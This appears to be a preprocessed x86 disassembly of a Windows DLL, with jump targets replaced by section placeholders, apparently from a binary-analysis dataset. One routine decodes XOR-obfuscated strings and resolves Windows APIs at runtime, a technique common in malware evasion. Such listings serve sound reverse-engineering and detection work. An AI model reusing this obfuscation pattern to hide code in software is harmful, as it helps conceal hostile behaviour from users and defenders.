mov eax 0x7e
mov [ ebp - 0x118 ] edi
call sub_1002f620
lea eax [ ebp - 0x118 ]
push eax
mov ecx edx
push ecx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x1f
call sub_1002f620
mov [ ebp - 0xf8 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x2c
mov [ ebp - 0x114 ] edi
call sub_1002f620
lea edx [ ebp - 0x114 ]
push edx
lea eax [ ebp - 0x70 ]
push eax
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x4b
call sub_1002f620
mov [ ebp - 0xf8 ] 0x4
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0xc5
mov [ ebp - 0x10c ] edi
call sub_1002f620
lea ecx [ ebp - 0x10c ]
push ecx
push edx
call sub_1004e270
lea edx [ ebp - 0x90 ]
mov eax 0x7a
mov [ ebp - 0x100 ] edi
call sub_1002f620
lea eax [ ebp - 0x100 ]
push eax
mov ecx edx
push ecx
call sub_1004e270
add esp 0x10
push 0x24
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x5b
call sub_1002f620
xor eax eax
mov edx [ ebp - 0x100 ]
mov ecx [ ebp - 0x10c ]
push edx
mov edx [ ebp - 0x114 ]
push ecx
mov ecx [ ebp - 0x108 ]
push edx
mov edx [ ebp - 0x104 ]
push ecx
mov ecx [ ebp - 0x110 ]
push edx
mov edx [ ebp - 0x118 ]
mov esi eax
call sub_100218e0
jmp r-xdata
mov edi eax
call sub_1000a5a0
xor edi edi
mov [ ebx ] eax
mov ebx [ ebp - 0xfc ]
cmp ebx edi
je r-xdata
sub_10023c3a
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_1002e103
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_1005aa2b
sub_10023c70
push esi
mov esi [ ebx ]
test esi esi
je r-xdata
xor eax eax
mov [ ebx ] eax
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] eax
pop esi
retn
push edi
mov edi [ ebx + 0x4 ]
cmp esi edi
je r-xdata
mov eax [ ebx ]
push eax
call sub_1000a86e
add esp 0x4
pop edi
nop
call sub_10051380
sub esi 0xffffff80
cmp esi edi
jne r-xdata
sub_10023cd6
mov edi edi
push ebp
mov ebp esp
push esi
xor eax eax
push 0xffffffff
mov esi ecx
and [ esi + 0x10 ] 0x0
push eax
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_1000838d
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10023d20
push ebp
mov ebp esp
sub esp 0x118
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x190
push 0x0
push rw-data
call sub_1007f8f0
mov ecx [ r--data ]
add esp 0xc
xor eax eax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffbd
and edx 0xff
mov [ ebp + eax * 2 - 0xc0 ] dx
inc eax
cmp eax 0xc
jb r-xdata
push edi
lea ecx [ ebp - 0xc0 ]
xor eax eax
push ecx
mov [ ebp - 0xa8 ] ax
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ r--data ]
xor cl cl
xor eax eax
lea ebx [ ebx ]
lea eax [ edi + 0x64 ]
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov dl [ eax + esi ]
xor dl cl
xor dl 0xd2
inc cl
mov [ ebp + eax - 0x28 ] dl
movzx eax cl
cmp eax 0xb
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x1d ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x37
inc cl
mov [ ebp + eax - 0x10 ] dl
movzx eax cl
cmp eax 0x8
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x8 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x33
inc cl
mov [ ebp + eax - 0x1c ] dl
movzx eax cl
cmp eax 0x9
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x13 ] 0x0
xor eax eax
lea esp [ esp ]
mov dl [ eax + esi ]
xor dl cl
xor dl 0xb2
inc cl
mov [ ebp + eax - 0x3c ] dl
movzx eax cl
cmp eax 0xb
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x31 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x3c
inc cl
mov [ ebp + eax - 0x5c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x50 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0xdc
inc cl
mov [ ebp + eax - 0x6c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x60 ] 0x0
xor eax eax
lea esp [ esp ]
mov dl [ eax + esi ]
xor dl cl
xor dl 0xa7
inc cl
mov [ ebp + eax - 0x90 ] dl
movzx eax cl
cmp eax 0x13
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x7d ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x71
inc cl
mov [ ebp + eax - 0x4c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
mov esi [ GetProcAddress@IAT ]
lea eax [ ebp - 0x28 ]
push eax
push edi
mov [ ebp - 0x40 ] 0x0
call esi
lea ecx [ ebp - 0x10 ]
push ecx
push edi
mov [ rw-data ] eax
call esi
lea edx [ ebp - 0x1c ]
push edx
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x3c ]
push eax
push edi
call esi
lea ecx [ ebp - 0x5c ]
push ecx
push edi
mov [ rw-data ] eax
call esi
lea edx [ ebp - 0x6c ]
push edx
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x90 ]
push eax
push edi
call esi
lea ecx [ ebp - 0x4c ]
push ecx
push edi
mov [ rw-data ] eax
call esi
mov edi [ r--data ]
mov [ rw-data ] eax
xor cl cl
xor eax eax
mov dl [ eax + edi ]
xor dl cl
xor dl 0xf9
inc cl
mov [ ebp + eax - 0x7c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
push ebx
lea eax [ ebp - 0x7c ]
push eax
mov [ ebp - 0x70 ] 0x0
call [ GetModuleHandleA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edi [ ebp - 0xdc ]
mov eax 0x4
call sub_10002ca0
lea edi [ ebp - 0xa4 ]
mov eax 0xd
call sub_10002ca0
lea edi [ ebp - 0x118 ]
mov eax 0xb
call sub_10002ca0
lea edi [ ebp - 0xf8 ]
mov eax 0xe
call sub_10002ca0
lea edi [ ebp - 0x30 ]
mov eax 0x3
call sub_10002ca0
lea ecx [ ebp - 0xdc ]
push ecx
push ebx
call esi
lea edx [ ebp - 0xa4 ]
push edx
push ebx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x118 ]
push eax
push ebx
call esi
lea ecx [ ebp - 0xf8 ]
push ecx
push ebx
mov [ rw-data ] eax
call esi
mov edx edi
push edx
push ebx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov [ rw-data ] sub_10025810
mov [ rw-data ] sub_10003610
mov [ rw-data ] sub_100699a0
mov [ rw-data ] sub_10044540
mov [ rw-data ] sub_1002b3c0
mov [ rw-data ] sub_10042ef0
mov [ rw-data ] sub_10015970
mov [ rw-data ] sub_10039450
mov [ rw-data ] sub_100345b0
mov [ rw-data ] sub_10049530
mov [ rw-data ] sub_1002c4d0
mov [ rw-data ] sub_10064aa0
mov [ rw-data ] sub_100097a0
mov [ rw-data ] sub_10060490
mov [ rw-data ] sub_1005b7f0
mov eax 0x1
pop ebx
pop esi
mov eax 0xc8
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop ebx
pop esi
xor ecx ebp
pop edi
call sub_10032529
mov esp ebp
pop ebp
retn
inc eax
cmp eax 0x1d
jl r-xdata
cmp [ eax * 4 + rw-data ] 0x0
je r-xdata
xor eax eax
mov cl 0x38
jmp r-xdata
xor [ eax + rw-data ] cl
inc eax
cmp eax 0x190
jb r-xdata
xor eax eax
sub_10024100
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi ecx
call sub_100715f0
test eax eax
je r-xdata
mov ecx edi
call sub_10022070
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x123
call sub_1002f620
mov eax 0x1
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx edi
call sub_10033170
test eax eax
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x8b
call sub_1002f620
mov eax 0x2
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx edi
call sub_100166c0
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x18
call sub_1002f620
mov esi edi
call sub_1000baa0
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x43
call sub_1002f620
mov eax 0x4
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
call sub_100677f0
test eax eax
jne r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x31
call sub_1002f620
mov eax 0x5
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x60 ]
mov eax 0x9d
call sub_1002f620
mov eax 0x6
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
call sub_10068670
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10024230
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
mov ecx [ rw-data ]
fld [ r--data ]
fsubr st1
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jne r-xdata
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fldz
fstp [ ecx + 0xfc ]
pop ebp
retn 0x4
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld [ r--data ]
fstp [ ecx + 0xfc ]
pop ebp
retn 0x4
fxch st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcompp
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld1
fstp [ ecx + 0xfc ]
pop ebp
retn 0x4
pop ebp
retn 0x4
fld [ r--data ]
fstp [ ecx + 0xfc ]
sub_10024310
push ebp
mov ebp esp
sub esp 0x104
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x100 ] eax
mov eax [ ecx ]
push esi
push edi
mov [ ebp - 0x104 ] 0x0
test eax eax
jne r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
cmp [ ebx ] 0x3b
je r-xdata
mov ecx ebx
lea edi [ ebp - 0xf8 ]
mov [ ebp - 0xe0 ] 0x0
call sub_10052f10
test al al
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
mov esi 0x64
push esi
lea edx [ ebp - 0x70 ]
push 0x0
push edx
add ebx 0x10
call sub_1007f8f0
push ebx
lea eax [ ebp - 0xfc ]
push eax
lea ecx [ ebp - 0x70 ]
push ecx
lea eax [ esi - 0x5c ]
mov [ ebp - 0xfc ] esi
call sub_10015140
add esp 0x18
test eax eax
jne r-xdata
mov eax 0x7
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0xfc ]
push edx
lea eax [ ebp - 0x70 ]
push eax
lea ecx [ ebp - 0xf4 ]
push ecx
call sub_1007f580
push esi
lea edx [ ebp - 0xd8 ]
push 0x0
push edx
add ebx 0x8
call sub_1007f8f0
push ebx
lea eax [ ebp - 0xfc ]
push eax
lea ecx [ ebp - 0xd8 ]
push ecx
lea eax [ esi - 0x4c ]
mov [ ebp - 0xfc ] esi
call sub_10015140
add esp 0x24
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x8
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0xfc ]
push edx
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0xf0 ]
push ecx
call sub_1007f580
mov esi [ ebp - 0xf0 ]
add ebx 0x18
add esp 0xc
mov edx esi
mov ecx ebx
call sub_10029d90
cmp eax [ ebp - 0xe8 ]
push esi
sete dl
push 0x8
mov [ ebp - 0xdc ] dl
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
mov eax [ ebp - 0xf0 ]
push eax
push ebx
push esi
call sub_1007f580
mov eax [ ebp - 0xf0 ]
mov ecx [ ebp - 0x104 ]
lea edx [ ecx + eax + 0x30 ]
mov [ ebp - 0x104 ] edx
mov edx [ ebp - 0x100 ]
add ebx eax
mov eax [ edx + 0x4 ]
mov ecx edi
add esp 0xc
mov [ ebp - 0xe0 ] esi
cmp ecx eax
jae r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jne r-xdata
mov edi [ edx ]
cmp edi ecx
ja r-xdata
mov edi [ edx + 0x4 ]
test edi edi
je r-xdata
mov esi [ edx ]
sub eax esi
sar eax 0x5
cmp eax 0x7fffffe
ja r-xdata
mov esi ecx
mov ecx [ edx + 0x8 ]
sub esi edi
cmp eax ecx
jne r-xdata
add [ edx + 0x4 ] 0x20
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x104 ]
cmp eax [ edx ]
jb r-xdata
lea esi [ ebp - 0xf8 ]
push r--data
call sub_10030594
sub ecx esi
inc eax
sar ecx 0x5
cmp eax ecx
jbe r-xdata
mov edi [ edx + 0x4 ]
and esi 0xffffffe0
add esi [ edx ]
test edi edi
je r-xdata
sub eax edi
sar eax 0x5
cmp eax 0x7fffffe
ja r-xdata
mov esi ecx
shr esi 0x1
mov edi 0x7ffffff
sub edi esi
cmp edi ecx
jae r-xdata
jmp r-xdata
sub ecx edi
inc eax
sar ecx 0x5
mov [ ebp - 0xfc ] eax
cmp eax ecx
jbe r-xdata
add ecx esi
xor ecx ecx
jmp r-xdata
mov ecx 0x8
[ edi ] [ esi ]
mov eax ecx
shr eax 0x1
mov edi 0x7ffffff
sub edi eax
cmp edi ecx
jae r-xdata
call sub_100683a0
mov edx [ ebp - 0x100 ]
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx eax
xor ecx ecx
jmp r-xdata
call sub_100683a0
mov edx [ ebp - 0x100 ]
mov ecx eax
mov eax [ ebp - 0xfc ]
cmp ecx eax
jae r-xdata
sub_10024610
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
mov [ ebp + 0x10 ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test ecx ecx
je r-xdata
pop esi
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
dec edi
jne r-xdata
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov [ ecx ] si
movzx eax si
jmp r-xdata
mov ecx 0xffff
cmp cx ax
mov ecx [ ebp + 0x14 ]
jne r-xdata
sub_100246b4
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004174a
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10024760
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push esi
mov esi ecx
mov ecx [ eax + 0xf4 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x4
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x210 ]
push edx
call [ StrCpyW@IAT ]
lea ecx [ ebp - 0x210 ]
xor esi esi
call sub_10032820
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0xe8 ] 0x0
mov [ eax + 0xf0 ] 0x0
mov [ eax + 0xec ] 0x1
mov eax [ eax + 0xf4 ]
push eax
call [ ReleaseMutex@IAT ]
mov eax esi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea esi [ eax + 0x8 ]
sub_10024808
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_1005b670
mov esi [ eax ]
call sub_1005b670
push [ ebp + 0xc ]
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_1003451c
fstp [ ebp - 0x8 ]
pop ecx
pop ecx
call sub_1005b670
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
call sub_1005b670
fld [ r--data ]
mov [ eax ] esi
mov eax [ ebp + 0x10 ]
pop esi
jmp r-xdata
test eax eax
jg r-xdata
fld [ ebp - 0x8 ]
dec eax
fmul st1
fstp [ ebp - 0x8 ]
jns r-xdata
fstp st0
fld [ ebp - 0x8 ]
leave
retn
neg eax
dec eax
fld [ ebp - 0x8 ]
fdiv st1
fstp [ ebp - 0x8 ]
jne r-xdata
sub_10024880
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov eax [ ebx ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax esi
je r-xdata
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
test eax eax
je r-xdata
mov [ ebx ] 0x0
test esi esi
je r-xdata
push eax
call sub_1001b2d2
add esp 0x4
cmp [ esi ] 0x0
mov eax esi
je r-xdata
sub eax esi
push edi
lea edi [ eax + 0x1 ]
push edi
call sub_10021090
add esp 0x4
mov [ ebx ] eax
test eax eax
je r-xdata
mov edi edi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
push edi
push esi
push eax
call sub_1007f580
add esp 0xc
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_100248e7
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10031232
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10024984
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1006ee94
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1000f103
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100234cf
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x1c
sub_10024a00
push ebp
mov ebp esp
push 0xffffffff
push sub_10089efa
mov eax [ fs : 0x0 ]
push eax
sub esp 0x180
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
cmp [ ebx + 0xec ] 0x0
mov edi edx
mov [ ebp - 0x178 ] eax
mov [ ebp - 0x180 ] edi
jne r-xdata
push 0x10
lea ecx [ edi + 0x8 ]
lea esi [ ebp - 0x164 ]
call sub_100662b0
add esp 0x4
mov ecx [ ebp - 0x180 ]
xor edx edx
mov [ ebp - 0x4 ] edx
mov eax [ edi + 0x8 ]
mov ecx [ ecx + 0x18 ]
push eax
push ecx
mov edi 0xf
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x30 ] dl
call sub_1003e780
mov eax [ ebp - 0x178 ]
mov edx esi
push edx
push eax
lea ecx [ ebp - 0x68 ]
push ecx
mov [ ebp - 0x4 ] 0x1
call sub_10066ab0
add esp 0xc
lea ecx [ ebp - 0x30 ]
lea esi [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x2
call sub_10069410
mov esi 0x10
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov eax 0x42
jmp r-xdata
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov edx [ ebp - 0x68 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0xbc ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0xa8 ] esi
jae r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_1000a86e
add esp 0x4
mov edx [ ebp - 0xac ]
call sub_10029d90
push 0x5
lea esi [ ebp - 0x174 ]
mov edi ebx
mov [ ebp - 0x178 ] eax
call sub_1006ff30
mov [ ebp - 0x4 ] 0x6
push 0x2
push r--data
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0xc4 ] 0xf
mov [ ebp - 0xc8 ] 0x0
mov [ ebp - 0xd8 ] 0x0
call sub_1003e780
mov [ ebp - 0x4 ] 0x7
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
lea ecx [ ebp - 0xbc ]
push esi
lea eax [ ebp - 0x174 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_10017cc0
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_100651be
push esi
push ebx
lea eax [ ebp - 0x174 ]
call sub_100215e0
lea ecx [ ebp - 0xbc ]
push ecx
lea edx [ ebp - 0x110 ]
push r--data
push edx
mov [ ebp - 0x180 ] eax
call sub_10003080
add esp 0xc
mov [ ebp - 0x4 ] 0x8
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x174 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0x110 ]
call sub_10017cc0
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_100215e0
mov edx [ ebp - 0x178 ]
push edx
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x188 ] eax
call sub_10011ee0
add esp 0x4
push eax
lea eax [ ebp - 0xf4 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x9
call sub_100282d0
add esp 0xc
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x54 ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov esi 0xf
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x68 ] 0x0
cmp eax 0x2
ja r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_1000a86e
add esp 0x4
lea eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0x174 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0xf4 ]
call sub_10017cc0
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_100651be
lea eax [ edi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_100215e0
push 0x1
push r--data
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x178 ] eax
mov [ ebp - 0x8c ] esi
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0xa0 ] 0x0
call sub_1003e780
mov [ ebp - 0x4 ] 0xc
cmp [ ebx ] 0x0
push 0x1
lea ecx [ ebp - 0xa0 ]
jne r-xdata
push r--data
call sub_100651be
push r--data
push r--data
jmp r-xdata
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x174 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_10017cc0
